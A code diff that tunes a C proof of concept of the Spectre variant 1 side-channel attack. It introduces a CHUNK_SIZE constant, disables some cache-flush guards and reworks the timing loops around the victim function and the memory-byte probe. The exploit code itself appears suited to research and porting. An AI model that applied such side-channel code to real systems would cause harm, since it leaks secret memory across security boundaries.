@@ -75,6 +75,7 @@
 /********************************************************************
 Victim code.
 ********************************************************************/
+#define CHUNK_SIZE 512
 unsigned int array1_size = 16;
 uint8_t unused1[64*64];
 uint8_t array1[16] = {
@@ -96,7 +97,7 @@ uint8_t array1[16] = {
   16
 };
 uint8_t unused2[64*64];
-uint8_t array2[256 * 512];
+uint8_t array2[256 * CHUNK_SIZE];
 
 uint8_t unused3[64*64];
 
@@ -143,7 +144,7 @@ void victim_function(size_t x) {
 #ifdef LINUX_KERNEL_MITIGATION
     x &= array_index_mask_nospec(x, array1_size);
 #endif
-    temp &= array2[array1[x] * 512];
+    temp &= array2[array1[x] * CHUNK_SIZE];
   }
 }
 
@@ -198,12 +199,12 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
   register int time3;
   volatile uint8_t * addr;
 
-#ifdef NOCLFLUSH
+// #ifdef NOCLFLUSH
   int junk2 = 0;
   int junk1 = 45;
   int l;
   (void)junk2;
-#endif
+// #endif
 
   for (i = 0; i < 256; i++)
   {
@@ -213,9 +214,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
   for (tries = 999; tries > 0; tries--) {
 
 #ifndef NOCLFLUSH
-    /* Flush array2[512*(0..255)] from cache */
+    /* Flush array2[CHUNK_SIZE*(0..255)] from cache */
     for (i = 0; i < 256; i++)
-      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
+      _mm_clflush( & array2[i * CHUNK_SIZE]); /* intrinsic for clflush instruction */
 #else
 #ifndef NOSSE
     /* Flush array2[256*(0..255)] from cache
@@ -224,7 +225,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     {
       
       for (i = 0; i < 256; i++)
-        flush_memory_sse( & array2[i * 512]);
+        flush_memory_sse( & array2[i * CHUNK_SIZE]);
     }
 #else
       /* Alternative to using sse instructions to flush the CPU cache */
@@ -246,7 +247,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
          Do this around 2000 times, or more depending on CPU cache size. */
-      for (k = 0; k < 10; k++)
+      // for (k = 0; k < 10; k++)
       for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
         junk2 ^= cache_flush_array[l];
       } 
@@ -269,7 +270,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
-      addr = & array2[mix_i * 512];
+      addr = & array2[mix_i * CHUNK_SIZE];
 
     /*
     We need to accuratly measure the memory access to the current index of the
@@ -336,13 +337,20 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #else
 #ifndef NOMFENCE
       int m;
-      for (m=0;m<50;m++)
+      for (m=0;m<70;m++)
       {
-        reset_counter();
-        time1 += get_counter();
+        // reset_counter();
+        _mm_mfence();
+        time1 = get_counter();
+        _mm_mfence();
+        junk2 = junk1;
+        _mm_mfence();
+        time2 = get_counter();
+        _mm_mfence();
+        time2 = (time2-time1);
       }
       _mm_mfence();
-      reset_counter();
+      time1 = get_counter();
       _mm_mfence();
       junk = * addr; /* MEMORY ACCESS TO TIME */
       _mm_mfence();
@@ -352,16 +360,16 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       // printf("time2: %d\n", time2);
 #else
       int m;
-      for (m=0;m<50;m++)
+      for (m=0;m<70;m++)
       {
         // reset_counter();
         time1 = get_counter();
         junk2 = junk1;
         time2 = get_counter();
-        time2 += (time2-time1);
+        time2 = (time2-time1);
       }
       // reset_counter();
-        time1 = get_counter();
+      time1 = get_counter();
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = get_counter();
       time2 = (time2-time1);
@@ -369,6 +377,12 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #endif /* ndef NOMFENCE*/
 #endif /* ndef NORDTSC */
 #endif /* ndef NORDTSCP */
+// #ifdef NOCLFLUSH
+//       // for (k = 0; k < 10; k++)
+//       for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
+//         junk2 ^= cache_flush_array[l];
+//       }
+// #endif /* NOCLFLUSH */
       if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
       // if(mix_i != array1[tries % array1_size])
